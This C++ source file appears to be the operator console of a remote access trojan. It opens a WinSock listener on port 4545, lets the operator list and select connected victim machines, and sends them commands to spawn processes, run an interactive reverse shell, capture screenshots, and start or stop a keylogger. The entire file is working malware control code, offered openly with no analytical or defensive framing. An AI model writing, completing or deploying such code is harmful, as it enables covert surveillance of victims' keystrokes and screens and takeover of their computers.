#include <iostream>

#include "Trace.h"
#include "Entrypoint.h"
#include "ICommunicationFactory.h"
#include "IRatManager.h"

Entrypoint::Entrypoint()
	:
	_factory(CreateFactory()),
	_manager(
		CreateRatManager(
			_factory.get(),
			_factory->CreateWinSockConnectionListener(4545)))
{
	Startup();

	while (true)
	{
		ParseInput();

		if (_commands.contains(_command))
		{
			try
			{
				_commands[_command]();
			}
			catch(const std::exception& e)
			{
				Trace("Failed to execute command.\n%s\n", e.what());
			}
		}
		else
		{
			Trace("Command unknown\n");
		}

		Trace("\n> ");
	}
}

void Entrypoint::Startup()
{
	_commands["c"] = [this] { SendChatMessage(); };
	_commands["chat"] = [this] { SendChatMessage(); };

	_commands["p"] = [this] { SendCreateProcess(); };
	_commands["process"] = [this] { SendCreateProcess(); };

	_commands["r"] = [this] { SendReverseShell(); };
	_commands["reverse"] = [this] { SendReverseShell(); };

	_commands["sc"] = [this] { SendTakeScreenshot(); };
	_commands["screenshot"] = [this] { SendTakeScreenshot(); };

	_commands["ks"] = [this] { SendStartKeyLogger(); };
	_commands["startkeylogger"] = [this] { SendStartKeyLogger(); };

	_commands["kk"] = [this] { SendStopKeyLogger(); };
	_commands["stopkeylogger"] = [this] { SendStopKeyLogger(); };

	_commands["l"] = [this] { ListClients(); };
	_commands["list"] = [this] { ListClients(); };

	_commands["s"] = [this] { SelectClient(); };
	_commands["select"] = [this] { SelectClient(); };


	Trace("> ");
}

void Entrypoint::SendChatMessage() const
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::Chat,
		_argsSpan);
}

void Entrypoint::SendCreateProcess() const
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::CreateProcessS,
		_argsSpan);
}

void Entrypoint::SendReverseShell()
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::StartReverseShell,
		_argsSpan);

	while (true)
	{
		ParseInput();

		if (_command == "exit")
		{
			_manager->Send(
				*_client,
				MessageType::StopReverseShell,
				_commandSpan);
			break;
		}

		_manager->Send(
			*_client,
			MessageType::ReverseShellMessage,
			_commandSpan);
	}
}

void Entrypoint::SendTakeScreenshot()
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::TakeScreenshot,
		_argsSpan);
}

void Entrypoint::SendStartKeyLogger()
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::StartKeyLog,
		_argsSpan);
}

void Entrypoint::SendStopKeyLogger()
{
	ValidateSelection();

	_manager->Send(
		*_client,
		MessageType::StopKeyLog,
		_argsSpan);
}

void Entrypoint::ListClients() const
{
	int i = 0;

	const auto clients = std::span(
		_manager->GetClients(),
		_manager->GetClientCount());

	for (const ClientInfo& clientInfo : clients)
	{
		Trace("Client %d: %s\n", i, clientInfo.Address);
		i++;
	}
}

void Entrypoint::SelectClient()
{
	if (_args.empty())
	{
		if (_client == nullptr)
		{
			throw std::runtime_error("Supply client to select!");
		}
	}
	else
	{
		_client = std::make_unique<int>(std::stoi(_args));
	}

	const auto clientPipe = _manager->GetClients()[*_client];

	Trace("Selected client %d: %s\n", *_client, clientPipe.Address);
}

void Entrypoint::ParseInput()
{
	std::string input;
	std::getline(std::cin, input);

	const int pos = input.find(' ');

	_command = input.substr(0, pos);
	_commandSpan = SharedSpan(_command);

	pos == -1
		? _args = ""
		: _args = input.substr(pos + 1);

	_argsSpan = SharedSpan(_args);
}

void Entrypoint::ValidateSelection() const
{
	if (_client == nullptr)
	{
		throw std::runtime_error("No client selected!");
	}
}
